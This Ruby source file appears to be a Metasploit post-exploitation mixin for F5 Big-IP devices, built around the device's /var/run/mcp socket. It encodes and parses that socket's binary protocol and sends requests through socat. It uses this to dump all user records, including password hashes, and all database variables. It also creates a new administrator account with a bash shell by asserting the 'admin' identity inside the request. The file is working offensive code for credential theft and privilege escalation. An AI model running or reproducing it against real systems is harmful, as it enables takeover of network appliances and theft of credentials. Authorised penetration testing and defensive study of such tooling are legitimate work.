# Encoding: ASCII-8BIT

module Msf
  class Post
    module Linux
      # The F5 mixin implements methods for querying F5's database, which
      # is found at `/var/run/mcp` on Big-IP and other F5 devices
      module F5
        # This is a subset of all possible objects:
        # https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-objects.txt
        TAGS_BY_NAME = {
          # Types
          'byte' => 0x0001,
          'bits' => 0x0002,
          'uword' => 0x0003,
          'long' => 0x0004,
          'ulong' => 0x0005,
          'uquad' => 0x0006,
          'ip_address_old' => 0x0007,
          'service' => 0x0008,
          'mac' => 0x0009,
          'date' => 0x000a,
          'time' => 0x000b,
          'tag' => 0x000c,
          'structure' => 0x000d,
          'array' => 0x000e,
          'string' => 0x000f,
          'blob' => 0x0010,
          'ptr' => 0x0011,
          'double' => 0x0012,

          # These are sometimes returned
          'partition_id' => 0x1009,
          'partition_id_query_partitions' => 0x100a,

          # Query types
          'query' => 0x0b64,
          'query_all' => 0x0b65,
          'query_reply' => 0x0b68,
          'create' => 0x0b5a,

          # Result types
          'result' => 0x0b54,
          'result_code' => 0x0b55,
          'result_message' => 0x0b56,
          'result_operation' => 0x0b57,
          'result_type' => 0x0b58,
          'result_attribute' => 0x0b59,

          # User types
          'userdb_entry' => 0x0b11,
          'userdb_entry_name' => 0x0b12,
          'userdb_entry_passwd' => 0x0b13,
          'userdb_entry_is_crypted' => 0x0b14,
          'userdb_entry_gecos' => 0x0b15,
          'userdb_entry_uid' => 0x0b16,
          'userdb_entry_gid' => 0x0b17,
          'userdb_entry_homedir' => 0x0b18,
          'userdb_entry_shell' => 0x0b19,
          'userdb_entry_role' => 0x0b1a,
          'userdb_entry_mark' => 0x0b1b,
          'userdb_entry_dirty_cnt' => 0x0b1c,
          'userdb_entry_object_id' => 0x0b1d,
          'userdb_entry_attributes' => 0x0b1e,
          'userdb_entry_validate_checkpoint' => 0x0b1f,
          'userdb_entry_validate_commit' => 0x0b20,
          'userdb_entry_user_role' => 0x0f8c,
          'userdb_entry_oldpasswd' => 0x1027,
          'userdb_entry_is_system' => 0x115f,
          'userdb_entry_partition_id' => 0x1fc9,
          'userdb_entry_description' => 0x2ad3,
          'userdb_entry_app_id' => 0x2ad4,
          'userdb_entry_strict_app_updates' => 0x2ad5,
          'userdb_entry_transaction_id' => 0x5116,
          'userdb_entry_session_limit' => 0xa081,

          # Database variable types
          'db_variable' => 0x084a,
          'db_variable_name' => 0x084b,
          'db_variable_display_name' => 0x084c,
          'db_variable_value' => 0x084d,
          'db_variable_default' => 0x084e,
          'db_variable_sync_type' => 0x084f,
          'db_variable_data_type' => 0x0850,
          'db_variable_minimum' => 0x0851,
          'db_variable_maximum' => 0x0852,
          'db_variable_enumerated' => 0x0853,
          'db_variable_mark' => 0x0854,
          'db_variable_dirty_cnt' => 0x0855,
          'db_variable_object_id' => 0x0856,
          'db_variable_validate_checkpoint' => 0x0857,
          'db_variable_validate_commit' => 0x0858,
          'db_variable_attributes' => 0x0859,
          'db_restore_info' => 0x108d,
          'db_restore_info_object_id' => 0x108e,
          'db_restore_info_last_object_id' => 0x108f,
          'db_restore_info_dossier' => 0x10b2,
          'db_variable_transaction_id' => 0x118f,
          'db_variable_scf_config' => 0x2874,
          'db_variable_app_id' => 0x2875,
          'db_variable_strict_app_updates' => 0x2876,

          'start_transaction' => 0x0b6c,
          'start_transaction_reset_level' => 0x0b6d,
          'end_transaction' => 0x0b6e,
          'user_role_partition' => 0x1004,
          'user_role_partition_partition' => 0x1008,
          'user_role_partition_user' => 0x1006,
          'user_role_partition_role' => 0x1007,
          'user_authenticated' => 0x1028,
          'user_authenticated_name' => 0x1029,
          'start_transaction_load_type' => 0x253e,
        }

        TAGS_BY_ID = TAGS_BY_NAME.invert()

        def mcp_parse_responses(incoming_data)
          replies = []

          while incoming_data.length > 16
            # Grab the length and remove the header from the incoming data
            expected_length, _, incoming_data = incoming_data.unpack('Na12a*')

            # Read the packet
            packet, incoming_data = incoming_data.unpack("a#{ expected_length }a*")

            # Sanity check
            if packet.length != expected_length
              print_warning("Message truncated!")
              return replies
            end

            # Parse it
            replies << mcp_parse(packet)
          end

          return replies
        end

        def mcp_send_recv(messages)
          # Attach headers to each message and combine them
          message = messages.map do |m|
            [m.length, 0, 0, 0, m].pack('NNNNa*')
          end.join('')

          # Encode as base64 so we can pass it on the commandline
          message = Rex::Text.encode_base64(message)

          # Sometimes, the service doesn't respond with a complete packet, but
          # instead truncates it. This only seems to happen on very long replies,
          # but we have a small loop here to try and compensate for that
          #
          # This is the best we can do without having access to an AF_UNIX
          # socket (or doing something much, much more complex)
          replies = []
          0.upto(4) do
            # Send the request messages(s) to the socket
            incoming_data = cmd_exec("echo '#{message}' | base64 -d | socat -t100 - UNIX-CONNECT:/var/run/mcp")

            # Fail if we got no response or no header
            if !incoming_data || incoming_data.length < 16
              print_error('Request to /var/run/mcp socket failed')
              return nil
            end

            # Get the expected length and make sure the full response is at least
            # that long
            expected_length = incoming_data.unpack('N').pop
            if incoming_data.length < expected_length
              vprint_warning("mcp responded with #{packet.length} bytes instead of the promised #{expected_length} bytes! Trying again...")
            else
              return mcp_parse_responses(incoming_data)
            end
          end

          print_error("mcp wouldn't respond with a full message, giving up")
          nil
        end

        # Recursively parse an mcp message from a binary stream into an object
        #
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-parser.rb
        def mcp_parse(stream)
          # Note: This has to be an array, not a hash, because there are often
          # duplicate entries (like multiple userdb_entry results when a query
          # is performed)
          result = []

          begin
            while stream.length > 2
              tag, type, stream = stream.unpack('nna*')

              tag  = TAGS_BY_ID[tag]  || "<unknown 0x%04x>" % tag
              type = TAGS_BY_ID[type] || "<unknown 0x%04x>" % type

              if type == 'structure'
                # Get the length and struct data, then recurse
                length, stream = stream.unpack('Na*')
                struct, stream = stream.unpack("a#{ length }a*")

                result << {
                  tag: tag,
                  value: mcp_parse(struct)
                }
              elsif type == 'string'
                length, otherlength, stream = stream.unpack('Nna*')

                # I'm sure the two length values have a semantic difference, but just check for sanity
                if otherlength + 2 != length
                  raise "Inconsistent string lengths: #{ length } + #{ otherlength }"
                end

                str, stream = stream.unpack("a#{ otherlength }a*")
                result << {
                  tag: tag,
                  value: str
                }
              elsif type == 'uquad'
                value, stream = stream.unpack('Q>a*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'ulong'
                value, stream = stream.unpack('Na*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'time'
                value, stream = stream.unpack('Na*')
                result << {
                  tag: tag,
                  value: Time.at(value)
                }
              elsif type == 'uword'
                value, stream = stream.unpack('na*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'long'
                value, stream = stream.unpack('Na*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'tag'
                value_tag, stream = stream.unpack('na*')
                result << {
                  tag: tag,
                  value: TAGS_BY_ID[value_tag]
                }
              elsif type == 'byte'
                value, stream = stream.unpack('Ca*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'mac'
                value, stream = stream.unpack('a6a*')
                value = value.bytes.map { |b| '%02x' % b }.join(':')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'array'
                length, stream = stream.unpack('Na*')
                array, stream = stream.unpack("a#{ length }a*")

                result << {
                  tag: tag,
                  value: "Array data: #{array.unpack('H*').pop}"
                }
              else
                raise "Unknown type: #{ type }"
                return
              end
            end
          rescue StandardError => e
            print_error(e.message)
            return nil
          end

          result
        end

        # Build an mcp message
        #
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-builder.rb
        def mcp_build(tag, type, data)
          if TAGS_BY_NAME[tag].nil?
            raise "Invalid mcp tag: #{ tag }"
          end
          if TAGS_BY_NAME[type].nil?
            raise "Invalid mcp type: #{ type }"
          end

          out = ''
          if type == 'structure'
            out = [data.join.length, data.join].pack('Na*')

            # while (out.length % 4) != 0
            #   out += "\0"
            # end
          elsif type == 'string'
            out = [data.length + 2, data.length, data].pack('Nna*')
          elsif type == 'uquad'
            out = [data].pack('Q>')
          elsif type == 'ulong'
            out = [data].pack('N')
          elsif type == 'uword'
            out = [data].pack('n')
          elsif type == 'long'
            out = [data].pack('N')
          elsif type == 'tag'
            out = [TAGS_BY_NAME[data]].pack('n')
          elsif type == 'byte'
            out = [data].pack('C')
          elsif type == 'mac'
            out = [data].pack('a6')
          else
            raise "Unknown type: #{ type }"
          end

          out = [TAGS_BY_NAME[tag], TAGS_BY_NAME[type], out].pack('nna*')

          return out
        end


        # Do a query_all request for something that will reply with a single
        # query result.
        #
        # Attempts to abstract away all the messiness in the protocol, instead
        # we just query for a type and get all the responses as an array of
        # hashes
        def mcp_query_one(querytype)
          # Get the raw result
          result = mcp_send_recv([
            mcp_build('query_all', 'structure', [
              mcp_build(querytype, 'structure', [])
            ])
          ])

          unless result
            print_error("mcp_send_recv failed")
            return nil
          end

          if result.length == 0
            print_error("mcp_send_recv query returned no results")
            return nil
          end

          if result.length > 1
            print_error("mcp_send_recv query returned multiple results")
            return nil
          end

          # The only result we want is `query_reply` - ignore others that
          # can be potentially included (such as partition info)
          result = result.pop.select { |r| r[:tag] == 'query_reply' }

          # Make sure we have a reply
          unless result.length
            print_error("Invalid response returned by mcp: no query_reply")
            return nil
          end

          if result.length > 1
            print_error("Invalid response returned by mcp: more than one query_reply")
            return nil
          end
          result = result.pop

          # We only care about the response
          result = result[:value]

          # Structure it into a more sensible format
          result = result.map do |single_result|
            single_result[:value].map do |r|
              [r[:tag], r[:value]]
            end.to_h
          end

          result
        end

        # Query the mcp socket for a list of users
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
        def mcp_query_all_users()
          mcp_query_one('userdb_entry')
        end

        # Query the mcp socket for a list of users
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
        def mcp_query_all_db_variables()
          mcp_query_one('db_variable')
        end

        # Create an administrative user
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-privesc.rb
        def mcp_create_user(username, password)
          unless password =~ /^$/
            vprint_status("Hashing the password")
            salt = "$6$#{Rex::Text.rand_text_alphanumeric(8)}$"
            password = password.crypt(salt)

            if !password || password.empty?
              print_error('Failed to crypt the password')
              return nil
            end
          end

          # These requests have to go in a single "session", which, to us, is
          # a single packet (since we don't have AF_UNIX sockets)
          result = mcp_send_recv([
            # Authenticate as "admin"
            mcp_build('user_authenticated', 'structure', [
              mcp_build('user_authenticated_name', 'string', 'admin')
            ]),

            # Start transaction
            mcp_build('start_transaction', 'structure', [
              mcp_build('start_transaction_load_type', 'ulong', 0)
            ]),

            # Create the role mapping
            mcp_build('create', 'structure', [
              mcp_build('user_role_partition', 'structure', [
                mcp_build('user_role_partition_user', 'string', username),
                mcp_build('user_role_partition_role', 'ulong',  0),
                mcp_build('user_role_partition_partition', 'string', '[All]'),
              ])
            ]),

            # Create the userdb entry
            mcp_build('create', 'structure', [
              mcp_build('userdb_entry', 'structure', [
                mcp_build('userdb_entry_name',         'string', username),
                mcp_build('userdb_entry_partition_id', 'string', 'Common'),
                mcp_build('userdb_entry_is_system',    'ulong',  0),
                mcp_build('userdb_entry_shell',        'string', '/bin/bash'),
                mcp_build('userdb_entry_is_crypted',   'ulong',  1),
                mcp_build('userdb_entry_passwd',       'string', password),
              ])
            ]),

            # Finish the transaction
            mcp_build('end_transaction', 'structure', [])
          ])

          result.each do |r|
            # Look for a tag called "result_message" in the response
            msg = r[0][:value].select { |r2| r2[:tag] == 'result_message' }

            # If it exists, warn the user
            if !msg.empty?
              print_warning("Server returned: #{msg.pop[:value]}")
            end
          end
        end
      end
    end
  end
end




